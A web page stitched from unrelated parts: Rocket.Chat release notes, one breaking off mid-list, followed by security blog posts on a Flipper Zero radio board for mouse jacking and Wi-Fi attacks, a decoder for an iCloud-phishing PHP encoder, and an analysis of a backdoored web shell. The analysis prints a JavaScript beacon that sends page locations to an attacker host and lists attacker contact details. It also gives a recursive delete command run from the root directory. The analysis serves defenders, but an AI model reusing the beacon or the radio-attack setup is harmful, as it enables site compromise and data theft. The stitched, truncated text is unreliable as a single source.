Pre-release

Pre-release

### Engine versions

* Node: `22.11.0`
* MongoDB: `5.0, 6.0, 7.0`
* Apps-Engine: `1.48.2-rc.0`

### Minor Changes

* ([#33060](https://github.com/RocketChat/Rocket.Chat/pull/33060)) Added `departmentsAllowedToForward` property to departments returned in the `livechat/config` endpoint
* ([#34153](https://github.com/RocketChat/Rocket.Chat/pull/34153)) Groups members by their roles in the room's member list for improved clarity
* ([#34940](https://github.com/RocketChat/Rocket.Chat/pull/34940)) Allows agents and managers to close Omnichannel rooms that for some reason ended up in a bad state. This "bad state" could be a room that appears open but it's closed. Now, the endpoint `livechat/room.closeByUser` will accept an optional `forceClose` parameter that will allow users to bypass most state checks we do on rooms and perform the room closing again so its state can be recovered.
* ([#34948](https://github.com/RocketChat/Rocket.Chat/pull/34948)) Adds voice calls data to statistics
* ([#34922](https://github.com/RocketChat/Rocket.Chat/pull/34922)) Fixes an issue where users without the "Preview public channel" permission would receive new messages sent to the channel
* ([#34191](https://github.com/RocketChat/Rocket.Chat/pull/34191)) Allows granting the `mobile-upload-file` permission to guests
* ([#34153](https://github.com/RocketChat/Rocket.Chat/pull/34153)) Adds `rooms.membersOrderedByRole` endpoint to retrieve members of groups and channels sorted according to their respective role in the room.

### Patch Changes

* ([#34904](https://github.com/RocketChat/Rocket.Chat/pull/34904)) Security Hotfix (<https://docs.rocket.chat/docs/security-fixes-and-updates>)
* ([#34846](https://github.com/RocketChat/Rocket.Chat/pull/34846)) Fixes the send attachments option not working on iOS browsers by moving it from the composer dropdown menu to the composer primary actions.
* ([#34858](https://github.com/RocketChat/Rocket.Chat/pull/34858)) Fixes an issue that prevented the apps-engine from reestablishing communications with subprocesses in some cases
* ([#34849](https://github.com/RocketChat/Rocket.Chat/pull/34849)) Fixes an issue where losing connection could break app's action buttons
* ([#34864](https://github.com/RocketChat/Rocket.Chat/pull/34864)) Allows users to fetch the `packageValue` of settings when calling `/settings` endpoint via `includeDefaults` query param.
* ([#34908](https://github.com/RocketChat/Rocket.Chat/pull/34908)) Fixes an issue where room scroll position wasn't being restored when moving between rooms.
* ([#34887](https://github.com/RocketChat/Rocket.Chat/pull/34887)) Fixes an issue where the system would throw the error: 'GUI Application error' while uninstalling an app(when on the requests tab).
* ([#34900](https://github.com/RocketChat/Rocket.Chat/pull/34900)) Fixes an issue that prevented room history from loading under certain conditions.
* ([#34503](https://github.com/RocketChat/Rocket.Chat/pull/34503)) Fixes an issue where changing user role in a room displays the wrong message
* ([#34873](https://github.com/RocketChat/Rocket.Chat/pull/34873)) Fixes SAML login redirecting to wrong room when using an invite link.
* ([#34839](https://github.com/RocketChat/Rocket.Chat/pull/34839)) Fixes apps actions showing in toolbar without an icon
* ([#34892](https://github.com/RocketChat/Rocket.Chat/pull/34892)) Fixes an issue where Rocket cat would send '%s' as the mongo version when using a deprecated but supported version of MongoDB.
* ([#34860](https://github.com/RocketChat/Rocket.Chat/pull/34860)) Fixes an issue where room's file list would incorrectly display incoming messages as files.
* ([#34210](https://github.com/RocketChat/Rocket.Chat/pull/34210)) Fixes livechat conversations not being assigned to the contact manager even when the "Assign new conversations to the contact manager" setting is enabled
* ([#34113](https://github.com/RocketChat/Rocket.Chat/pull/34113)) Fixes dates being incorrect when fetching omnichannel reports with the following time periods:

### Patch Changes

* Bump @rocket.chat/meteor version.
* Bump @rocket.chat/meteor version.
* ([#34918](https://github.com/RocketChat/Rocket.Chat/pull/34918) by [@dionisio-bot](https://github.com/dionisio-bot)) Fixes a behavior when running microservices that caused queue worker to process just the first 60 seconds of request.

  This was due to a mistakenly bound context. Queue Worker was changed to start doing work only after it received the first request.

  However, with the introduction of ASL and actual context on calls, the worker registration was absorbing the context of the call that created them, causing service calls happening inside the callbacks to fail because of a timeout.

[7.0.5](/RocketChat/Rocket.Chat/releases/tag/7.0.5)

### Engine versions

* Node: `20.17.0`
* MongoDB: `5.0, 6.0, 7.0`
* Apps-Engine: `undefined`

### Patch Changes

* Bump @rocket.chat/meteor version.
* ([#34924](https://github.com/RocketChat/Rocket.Chat/pull/34924) by [@dionisio-bot](https://github.com/dionisio-bot)) Fixes a behavior when running microservices that caused queue worker to process just the first 60 seconds of request.

  This was due to a mistakenly bound context. Queue Worker was changed to start doing work only after it received the first request.

  However, with the introduction of ASL and actual context on calls, the worker registration was absorbing the context of the call that created them, causing service calls happening inside the callbacks to fail because of a timeout.

[7.2.0](/RocketChat/Rocket.Chat/releases/tag/7.2.0)

## Summary

### What's new

Release 7.2 introduces new features and enhancements, including a contacts.checkExistence endpoint for identifying existing contacts, the ability to store call events, and detailed stats for the Contact Identification feature. The App Settings interface is now easier to navigate with accordion groups, and exporting messages as JSON files is a breeze with a new option. Workspace and subscription admin pages have been revamped for improved usability, while federation functionality has been strengthened to handle users and configurations more reliably.

### Bug fixes

This release also addresses a wide range of bugs: from fixing federated startup issues and unread message counters to resolving UI quirks like action menus on smaller screens and side panel sorting. Notifications, avatars, livechat metrics, and Twitter (X) link previews now work as intended, ensuring smoother user experiences. Additionally, performance improvements eliminate glitches like infinite callbacks and misfiring queues, making 7.2 faster and more reliable than ever.

### [3H34N Flipper Zero Board (Three in One – CC1101/NRF24L01/ESP32)](https://www.nezami.me/2024/08/3h34n-flipper-zero-board-three-in-one_13.html)

3H34N Flipper Zero Board (Three in One – CC1101/NRF24L01/ESP32)

[![3H34N Flipper Zero Board (Three in One – CC1101/NRF24L01/ESP32)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtiPavQ7ZH6zRZPBYqOyhEVGDURf96iv4Ri11ZkWBDRXAYIOy6BluTwtkxRo9elv9EuWsGm8-7fGqeLL8iJgTtAxmd-3_5RYAytjT6fZ8zEmzpysxpaxJMALn3v-_U9uP_OgAS4h-_Ti1lGv3pLueNyRIQ0-P_ckCQqSVsuXIzWtEyWR1hJNwQSd3b2ZA/w546-h548-rw/first.png "3H34N Flipper Zero Board (Three in One – CC1101/NRF24L01/ESP32)")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtiPavQ7ZH6zRZPBYqOyhEVGDURf96iv4Ri11ZkWBDRXAYIOy6BluTwtkxRo9elv9EuWsGm8-7fGqeLL8iJgTtAxmd-3_5RYAytjT6fZ8zEmzpysxpaxJMALn3v-_U9uP_OgAS4h-_Ti1lGv3pLueNyRIQ0-P_ckCQqSVsuXIzWtEyWR1hJNwQSd3b2ZA/s881/first.png)
I'm thrilled to announce that the PCB for the Flipper Zero board has been successfully completed. This design integrates three modules into a single board.![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCPyrxAWVACdamCO3TIprUsoBueMNcMDoliGTFJ8v0FTYq3IIdWAP8uFNz75lx8CfQ8R_Xx-JkJcDO4LjXl8osLEI1MBh8gVPG9UWodbuE_FvuAYlh2nLCmFNoG_N5ZjZczdD3rnTN9j4YPKjvr0lpp2D5vWgvqFxdN-FUYtjUBA0xIU1D4Cip4H6y0qU/w400-h260-rw/1.png)
As you can see, one side of the board houses two modules, while the other side holds one module. On the left, we have the NRF24L01; on the right, the CC1101; and on the back, the ESP32.

The **NRF24L01** module is used for mouse jacking and operates on the Bluetooth frequency. Please note that when using Bluetooth, the NRF24L01 conflicts with the CC1101, **so it’s necessary to remove the CC1101 from the board****, using pin headers.**[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIy7FRjADTurmDdmgbEdmNCtpJ-fhNGdZDEMW6lvzbJDgu0wcHP5AePD6z5FL_zADNEqpRPIDNYBAnoLwNPTVTr6TsB_LlRnyiavhz-nGRgtZ7CGjZyqzveApWAdRee0uDrQ__OxQxky749L8yVq_TEj4KYl7zVqV1VVnj1bFGBh5m7c3R8AIC6cEsB88/w400-h241-rw/3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIy7FRjADTurmDdmgbEdmNCtpJ-fhNGdZDEMW6lvzbJDgu0wcHP5AePD6z5FL_zADNEqpRPIDNYBAnoLwNPTVTr6TsB_LlRnyiavhz-nGRgtZ7CGjZyqzveApWAdRee0uDrQ__OxQxky749L8yVq_TEj4KYl7zVqV1VVnj1bFGBh5m7c3R8AIC6cEsB88/s1322/3.png)
On the right, we have the **CC1101** module, which helps increase the range of reception and transmission of sub-gigahertz radio signals. As you may know, the Flipper Zero already has an internal CC1101 module, but when you want to use sub-gigahertz, you should switch to the external module through the sub-gigahertz settings. You can also connect a custom antenna to extend the range.

On the back is the **ESP32**. Since the Flipper Zero doesn’t have an internal Wi-Fi chip, this module is essential for certain Wi-Fi attacks and is compatible with the [ESP32] Wi-Fi Marauder application on the Flipper Zero.

Additionally, we’ve included 3-position DIP switches to connect VCC power to each module as needed. This feature helps prevent conflicts and conserves battery life.

### ["iServer/Powered By iSender Team" decoder](https://www.nezami.me/2022/10/iserverpowered-by-isender-team-decoder.html)

When your iPhone is lost, some hackers provide a fake website like Apple and message you on WhatsApp or some social media to reset your password to unlock your iPhone and Disable "find my iPhone".
I checked and decoded some fake website scripts that steal iCloud data from a script and are encoded by a custom PHP encoder called "iServer/Powered By iSender Team".
decoder:
```
<?php
/*
 * Script to decrypt files encoded with iServer/Powered By iSender Team
*/

header('Content-type: text/html; charset=utf-8');

// Your encoded file path
$file = '/home/user/file.php';

/**
 * Return string after needle if it exists.
 */
function str_after($str, $needle, $last_occurence = false)
{
    $pos = strpos($str, $needle);

    if ($pos === false) return $str;

    return ($last_occurence === false)
        ? substr($str, $pos + strlen($needle))
        : substr($str, strrpos($str, $needle) + 1);
}

// get file content
$content = file_get_contents($file);

// split the eval section
$eval_code = str_after($content, "eval(");
$eval_code1 = strstr($eval_code, ")))", true);

// get first value
$value1 = str_after($eval_code1, "','"); //gets all text from needle on
$value2 = strstr($value1, "',", true); //gets all text before needle

// get two value
$value3 = str_after($value1, "','"); //gets all text from needle on
$value4 = strstr($value3, "'", true); //gets all text before needle

// decode the file
$myfile = file(str_replace('\\', '/', $file));
$file_ap = array_pop($myfile);
echo (base64_decode(strtr($file_ap, $value2, $value4)));

```

put your encoded file here:
```
// Your encoded file path
$file = '/home/user/file.php';

```

### [How Hackers Be Victim: Backdoor in PHP web shells](https://www.nezami.me/2020/08/backdoor-in-php-web-shells.html)

I decided to decode a PHP web shell that encoded by Fopo online encoder, it called "ATTACK SHELL PRiV9" or "K2ll33d Shell 2019" belong to "r00t.info".

PHP web shell:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGZ6oW1QH_DwAONO1RtJX-gs0SkCw-aC-GuvTKBBDxNR9B1Ka7fE_9J0rROE34qry-CebM33vzV3flaO109oaZ0IahLm-deIeEmIKDBftVddyN5xOqv6CfMYHjpXJrVFUssSLpLE9ZiuE/w513-h513-rw/1542648952.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGZ6oW1QH_DwAONO1RtJX-gs0SkCw-aC-GuvTKBBDxNR9B1Ka7fE_9J0rROE34qry-CebM33vzV3flaO109oaZ0IahLm-deIeEmIKDBftVddyN5xOqv6CfMYHjpXJrVFUssSLpLE9ZiuE/s1300/1542648952.png)

Encoded source:

it might be interesting to you what we encounter!?

as you see it contains backdoor malware that copies itself with newsr.php in all directory of the website and sends a location and info to the address "http://r00t.info/ccb.js" and the mail: "byhero44@gmail.com" with the password "a4cd2905b660e8b1bc73a7c4571252da" that encrypted with the MD5 algorithm.

ccb.js contain:

*a=new/\*\*/Image();a.src='http://www.expoilt.com/yaz.php?a='+escape(location.href);*

I changed all Http to Hxxp to prevent execute and harm your system, so if you want to run you need to back values to the original.

**another name and address are:**

> *Turkey Cyber Army team*
>
> *https://expoilt.com/yaz.php?a=*

> *http://r00t.info/txt/lamer.txt*

> *k2ll33d*
>
> *Indoxploit Shell*
>
> *Sym Bypass 403 Shell*
>
> *Berandal Indoxploit Shell V2.1*
>
> *Premium Wso Shell*
>
> *Whmcs Killer*
>
> *Mobile Shell V.05 2018 Private*
>
> *K2ll33d Shell*
>
> *3turr ~ Sh311*
>
> *Server V-8 Attack Shell*
>
> *Bypass shell*
>
> *Wordpress Mass Change Password 2019*
>
> *Smevk\_pathan Shell V3 Bypass Shell*
>
> *Leaf Php Mailer V.2.7*
>
> *Bloodsecurity Bypass Shell*
>
> *Anon Priv9 Shell*
>
> *Wso Shell*
>
> *R00t.info Priv7 Shell New 2016*
>
> *Wso Shell 4.2.2*
>
> *G5 Private Bypass Shell*

If you have used it, You need to know that your entire website is infected.

**the solution to clean:**

Look for "newsr.php" files on all of your directory website to remove it.

if you are using Linux use this command:

`find / -name newsr.php -exec rm -rf {} \;`

Also, if you have uploaded the file, delete it completely.

And even delete the CGI shell files that it created by the PHP web shell.

OWASP JoomScan Project
*by**Mohammad Reza Espargham,**Ali Razmjoo, and**Ehsan Nezami*
JoomScan is not aiming just at testing different vulnerabilities and trying to simulate attacks, the process always begins with information gathering and it proceeds step by step following ethical hacking techniques. The information-gathering phase is not limited to the web application but also the webserver and domain, also misconfigurations, human-errors, and different possible risks on the product.
